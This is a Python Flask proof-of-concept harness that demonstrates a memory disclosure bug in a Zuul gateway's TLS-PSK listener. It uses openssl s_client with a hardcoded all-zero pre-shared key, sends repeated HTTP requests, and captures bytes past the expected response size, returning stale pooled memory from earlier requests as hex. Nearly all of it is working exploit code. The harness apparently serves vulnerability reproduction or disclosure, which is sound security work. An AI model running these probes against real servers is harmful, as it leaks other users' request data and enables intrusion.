from __future__ import annotations

import os
import subprocess
import time

from flask import Flask, Response, jsonify, render_template

app = Flask(__name__)

ZUUL_HOST = os.environ.get("ZUUL_HOST", "zuul")
ZUUL_PSK_PORT = int(os.environ.get("ZUUL_PSK_PORT", "7002"))
PROBE_COUNT = int(os.environ.get("PROBE_COUNT", "10"))

# Must match HardcodedPskProvider.POC_PSK — 32 zero bytes
POC_PSK = bytes(32)
PSK_IDENTITY = "poc-client"

# Conservative ceiling for a correct HTTP/1.1 200 response to /healthcheck.
# "healthy" body + headers is well under 512 bytes.
# Any bytes above this are stale pooled memory from prior requests.
EXPECTED_CEILING = 512


def _openssl_probe(send_http: bool) -> dict:
    """
    Invoke openssl s_client with TLS 1.2 PSK.
    Returns {"ok": bool, "stdout": bytes, "stderr": str, "elapsed_ms": int, "error": str}.
    """
    cmd = [
        "openssl", "s_client",
        "-connect", f"{ZUUL_HOST}:{ZUUL_PSK_PORT}",
        "-tls1_2",
        "-psk", POC_PSK.hex(),
        "-psk_identity", PSK_IDENTITY,
        "-cipher", "PSK-AES128-CBC-SHA",
        "-quiet",
        "-no_ign_eof",
    ]

    stdin_data = (
        b"GET /healthcheck HTTP/1.1\r\n"
        b"Host: zuul\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    ) if send_http else b""

    started = time.monotonic()
    try:
        proc = subprocess.run(
            cmd,
            input=stdin_data,
            capture_output=True,
            timeout=20,
            check=False,
        )
    except subprocess.TimeoutExpired:
        return {
            "ok": False,
            "error": "openssl timed out — PSK listener not running or handshake failing",
            "elapsed_ms": 20000,
        }
    except Exception as exc:
        return {"ok": False, "error": str(exc), "elapsed_ms": 0}

    elapsed_ms = int((time.monotonic() - started) * 1000)
    stderr = proc.stderr.decode("utf-8", errors="replace")
    stdout = proc.stdout

    # openssl s_client exits 0 on clean close, 1 when the peer sends close_notify
    # (which is normal). Anything else, or "handshake failure" in stderr, is an error.
    handshake_failed = (
        "handshake failure" in stderr.lower()
        or "ssl handshake" in stderr.lower()
        or proc.returncode not in (0, 1)
    )
    if handshake_failed:
        return {"ok": False, "error": stderr.strip(), "elapsed_ms": elapsed_ms}

    if send_http and len(stdout) == 0:
        return {
            "ok": False,
            "error": "handshake ok but no HTTP response — check Zuul routing and backend",
            "elapsed_ms": elapsed_ms,
        }

    return {"ok": True, "stdout": stdout, "stderr": stderr, "elapsed_ms": elapsed_ms}


def run_raw_probe(index: int) -> dict:
    """
    One PSK connection + HTTP GET.  Measures bytes received vs EXPECTED_CEILING.
    With -Dio.netty.noPreferDirect=true, TlsPskUtils.getAppDataBytesAndRelease
    hits the hasArray() branch, returns the full Netty pool chunk (e.g. 2048 bytes),
    and the whole chunk is encrypted and sent — not just the HTTP response bytes.
    """
    result = {"index": index, "ok": False}

    r = _openssl_probe(send_http=True)
    result["elapsed_ms"] = r.get("elapsed_ms", 0)

    if not r["ok"]:
        result["error"] = r.get("error", "unknown error")
        return result

    stdout = r["stdout"]
    bytes_received = len(stdout)
    overflow = max(0, bytes_received - EXPECTED_CEILING)
    first_line = stdout.split(b"\r\n", 1)[0].decode("utf-8", errors="replace") if stdout else ""

    result["ok"] = True
    result["request_size_bytes"] = 84
    result["bytes_received"] = bytes_received
    result["expected_ceiling_bytes"] = EXPECTED_CEILING
    result["overflow_bytes"] = overflow
    result["overflow_detected"] = overflow > 0
    result["tail_hex"] = stdout[-128:].hex() if len(stdout) > 128 else stdout.hex()
    result["response_first_line"] = first_line
    return result


# ── Routes ────────────────────────────────────────────────────────────────────

@app.get("/")
def index() -> str:
    return render_template(
        "index.html",
        zuul_host=ZUUL_HOST,
        zuul_psk_port=ZUUL_PSK_PORT,
        probe_count=PROBE_COUNT,
    )


@app.post("/run/handshake")
def run_handshake() -> tuple[Response, int]:
    """
    Complete a real TLS 1.2 PSK handshake (no HTTP data).
    Confirms the listener is up and the zero key is accepted.
    """
    r = _openssl_probe(send_http=False)
    if r["ok"]:
        return jsonify({
            "ok": True,
            "bytes_received": 0,
            "response_first_line": "TLS-PSK handshake completed",
            "elapsed_ms": r["elapsed_ms"],
        }), 200
    return jsonify({"ok": False, "error": r.get("error", "unknown")}), 500


@app.post("/run/leak")
def run_leak() -> tuple[Response, int]:
    """
    Run PROBE_COUNT probes. Each sends an 84-byte HTTP GET over TLS-PSK and
    measures how many decrypted bytes come back. With the bug active, the server
    encrypts the full Netty pool chunk instead of readableBytes(), so overflow_bytes
    will be > 0 and tail_hex will show stale data from prior pooled allocations.
    """
    results = [run_raw_probe(i + 1) for i in range(PROBE_COUNT)]
    ok_results = [r for r in results if r.get("ok")]
    total_overflow = sum(r.get("overflow_bytes", 0) for r in ok_results)
    max_overflow = max((r.get("overflow_bytes", 0) for r in ok_results), default=0)

    return jsonify({
        "ok": True,
        "probe_count": len(results),
        "successes": len(ok_results),
        "failures": len(results) - len(ok_results),
        "total_overflow_bytes": total_overflow,
        "max_overflow_bytes": max_overflow,
        "results": results,
    }), 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "5000")))